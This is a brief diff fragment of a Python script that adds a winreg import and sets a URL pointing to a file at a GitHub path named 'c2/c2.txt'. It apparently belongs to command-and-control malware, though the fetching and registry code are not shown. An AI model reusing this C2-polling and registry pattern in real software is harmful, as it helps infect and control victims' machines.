@@ -15,6 +15,7 @@ from urllib.request import urlopen
 import socket
 import time
 import os
+import winreg
 
 url = "https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/c2.txt"
     
